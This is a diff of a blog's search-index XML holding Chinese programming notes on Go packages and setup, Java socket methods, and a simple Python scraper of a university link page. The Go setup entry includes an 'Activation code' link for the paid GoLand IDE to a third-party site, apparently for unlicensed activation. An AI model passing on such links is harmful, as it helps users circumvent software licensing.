-<p><code>package &lt;pkgName&gt;</code>（在我们的例子中是<code>package main</code>）这一行告诉我们当前文件属于哪个包，而包名<code>main</code>则告诉我们它是一个可独立运行的包，它在编译后会产生可执行文件。除了<code>main</code>包之外，其它的包最后都会生成<code>*.a</code>文件（也就是包文件）并放置在<code>$GOPATH/pkg/$GOOS_$GOARCH</code>中（以Mac为例就是<code>$GOPATH/pkg/darwin_amd64</code>）</p>
-<blockquote>
-<p>每一个可独立运行的Go程序，必定包含一个<code>package main</code>，在这个<code>main</code>包中必定包含一个入口函数<code>main</code>，而这个函数既没有参数，也没有返回值。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>go</category>
-      </categories>
-      <tags>
-        <tag>go</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java网络编程</title>
-    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
-<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -1958,6 +1907,67 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python实战</title>
+    <url>/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
+    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
+<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
+<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
+<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
+<p>使用requests库来获取网站的html页面</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://www.csu.edu.cn/index/xndh.htm"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.raise_for_status()				<span class="comment">#检查r的状态码是否为200，若不是则抛出异常</span></span><br><span class="line">    r.encoding = r.apparent_encoding	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"error!"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" alt="img"></p>
+<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
+<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
+<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = r.text</span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)		<span class="comment">#将html解析成BeautifulSoup对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）</span></span><br><span class="line"><span class="comment">#这里获得所有的a标签</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">    <span class="comment">#tag的属性值可直接用 tag_name['属性名'] 的方式获得</span></span><br><span class="line">    <span class="comment">#判断链接地址是否为一个网站</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i[<span class="string">'href'</span>].find(<span class="string">'http'</span>):</span><br><span class="line">        <span class="comment"># 构造输出</span></span><br><span class="line">        <span class="comment"># tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx</span></span><br><span class="line">        str1 = <span class="string">"网址："</span> + str(i[<span class="string">'href'</span>]) + <span class="string">"   名称："</span> + str(i.string) + <span class="string">'\n'</span></span><br><span class="line">		<span class="comment"># 输出一条链接的地址及名称</span></span><br><span class="line">        print(str1)</span><br></pre></td></tr></table></figure>
+<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
+<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
+<p>之后可以尝试对网页中的链接进行递归爬取等</p>
+<h3 id="链接去重"><a class="header-anchor" href="#链接去重"></a>链接去重</h3>
+<h3 id="并发爬取"><a class="header-anchor" href="#并发爬取"></a>并发爬取</h3>
+<h2 id="爬虫框架"><a class="header-anchor" href="#爬虫框架"></a>爬虫框架</h2>
+<h3 id="scrapy"><a class="header-anchor" href="#scrapy"></a>scrapy</h3>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>golang的安装配置</title>
+    <url>/2021/07/14/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="下载安装"><a class="header-anchor" href="#下载安装"></a>下载安装</h2>
+<p>下载地址：<a href="https://golang.google.cn/">https://golang.google.cn/</a></p>
+<p>安装后会自动添加环境变量</p>
+<p>运行安装程序完成后查看go版本，验证是否已正确安装</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go version    #查看版本</span><br></pre></td></tr></table></figure>
+<h2 id="配置"><a class="header-anchor" href="#配置"></a>配置</h2>
+<h3 id="env配置"><a class="header-anchor" href="#env配置"></a>env配置</h3>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env    #查看go环境变量</span><br><span class="line">go env -w [环境变量名]=[变量值]    #写入环境变量（go version &gt; 1.13）</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/07/14/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20210709091726706.png" alt="image-20210709091726706"></p>
+<p>主要需要配置GOPATH（项目工作目录）、GOPROXY（go获取依赖包的代理服务器，proxy可以设置多个，⽤逗号<code>,</code>分隔，其中<code>direct</code>为直连）、GOPRIVATE（go get通过代理服务拉取私有仓库时，匹配那些不⾛代理的私有仓库）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GOPROXY&#x3D;&quot;https:&#x2F;&#x2F;goproxy.cn,https:&#x2F;&#x2F;goproxy.io,direct&quot;</span><br><span class="line">GOPRIVATE&#x3D;&quot;*.gitlab.com,*.gitee.com&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="IDE配置"><a class="header-anchor" href="#IDE配置"></a>IDE配置</h3>
+<h4 id="goland"><a class="header-anchor" href="#goland"></a>goland</h4>
+<p>goland:<a href="https://www.jetbrains.com/go/">https://www.jetbrains.com/go/</a></p>
+<p>Activation code:<a href="http://vrg123.com/">http://vrg123.com/</a></p>
+<h4 id="VSCode"><a class="header-anchor" href="#VSCode"></a>VSCode</h4>
+<p>配置步骤：<a href="https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true">https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true</a></p>
+<p>更多配置：<a href="http://c.biancheng.net/view/6170.html">http://c.biancheng.net/view/6170.html</a></p>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>go</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>go</tag>
       </tags>
   </entry>
   <entry>
@@ -2208,33 +2218,23 @@
       </tags>
   </entry>
   <entry>
-    <title>Python实战</title>
-    <url>/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
-    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
-<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
-<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
-<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
-<p>使用requests库来获取网站的html页面</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://www.csu.edu.cn/index/xndh.htm"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.raise_for_status()				<span class="comment">#检查r的状态码是否为200，若不是则抛出异常</span></span><br><span class="line">    r.encoding = r.apparent_encoding	<span class="comment">#设置编码方式为从内容中分析出的编码方式</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">"error!"</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" alt="img"></p>
-<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
-<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
-<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = r.text</span><br><span class="line">soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)		<span class="comment">#将html解析成BeautifulSoup对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）</span></span><br><span class="line"><span class="comment">#这里获得所有的a标签</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>):</span><br><span class="line">    <span class="comment">#tag的属性值可直接用 tag_name['属性名'] 的方式获得</span></span><br><span class="line">    <span class="comment">#判断链接地址是否为一个网站</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i[<span class="string">'href'</span>].find(<span class="string">'http'</span>):</span><br><span class="line">        <span class="comment"># 构造输出</span></span><br><span class="line">        <span class="comment"># tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx</span></span><br><span class="line">        str1 = <span class="string">"网址："</span> + str(i[<span class="string">'href'</span>]) + <span class="string">"   名称："</span> + str(i.string) + <span class="string">'\n'</span></span><br><span class="line">		<span class="comment"># 输出一条链接的地址及名称</span></span><br><span class="line">        print(str1)</span><br></pre></td></tr></table></figure>
-<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
-<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
-<p>之后可以尝试对网页中的链接进行递归爬取等</p>
-<h3 id="链接去重"><a class="header-anchor" href="#链接去重"></a>链接去重</h3>
-<h3 id="并发爬取"><a class="header-anchor" href="#并发爬取"></a>并发爬取</h3>
-<h2 id="爬虫框架"><a class="header-anchor" href="#爬虫框架"></a>爬虫框架</h2>
-<h3 id="scrapy"><a class="header-anchor" href="#scrapy"></a>scrapy</h3>
+    <title>golang项目结构</title>
+    <url>/2021/07/17/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<p>GOPATH下的src目录就是接下来开发程序的主要目录，所有的源码都是放在这个目录下面，那么一般我们的做法就是一个目录一个项目，例如: $GOPATH/src/mymath 表示mymath这个应用包或者可执行应用，这个根据package是main还是其他来决定，main的话就是可执行应用，其他的话就是应用包</p>
+<p>所以当新建应用或者一个代码包时都是在src目录下新建一个文件夹，文件夹名称一般是代码包名称，当然也允许多级目录，例如在src下面新建了目录$GOPATH/src/github.com/astaxie/beedb 那么这个包路径就是&quot;<a href="http://github.com/astaxie/beedb">github.com/astaxie/beedb</a>&quot;，包名称是最后一个目录beedb</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin&#x2F;</span><br><span class="line">    mathapp</span><br><span class="line">pkg&#x2F;</span><br><span class="line">    平台名&#x2F; 如：darwin_amd64、linux_amd64</span><br><span class="line">         mymath.a</span><br><span class="line">         github.com&#x2F;</span><br><span class="line">              astaxie&#x2F;</span><br><span class="line">                   beedb.a</span><br><span class="line">src&#x2F;</span><br><span class="line">    mathapp</span><br><span class="line">          main.go</span><br><span class="line">      mymath&#x2F;</span><br><span class="line">          sqrt.go</span><br><span class="line">      github.com&#x2F;</span><br><span class="line">           astaxie&#x2F;</span><br><span class="line">                beedb&#x2F;</span><br><span class="line">                    beedb.go</span><br><span class="line">                    util.go</span><br></pre></td></tr></table></figure>
+<p>Go程序是通过<code>package</code>来组织的</p>
+<p><code>package &lt;pkgName&gt;</code>（在我们的例子中是<code>package main</code>）这一行告诉我们当前文件属于哪个包，而包名<code>main</code>则告诉我们它是一个可独立运行的包，它在编译后会产生可执行文件。除了<code>main</code>包之外，其它的包最后都会生成<code>*.a</code>文件（也就是包文件）并放置在<code>$GOPATH/pkg/$GOOS_$GOARCH</code>中（以Mac为例就是<code>$GOPATH/pkg/darwin_amd64</code>）</p>
+<blockquote>
+<p>每一个可独立运行的Go程序，必定包含一个<code>package main</code>，在这个<code>main</code>包中必定包含一个入口函数<code>main</code>，而这个函数既没有参数，也没有返回值。</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>编程语言</category>
-        <category>Python</category>
+        <category>go</category>
       </categories>
       <tags>
-        <tag>Python</tag>
+        <tag>go</tag>
       </tags>
   </entry>
   <entry>
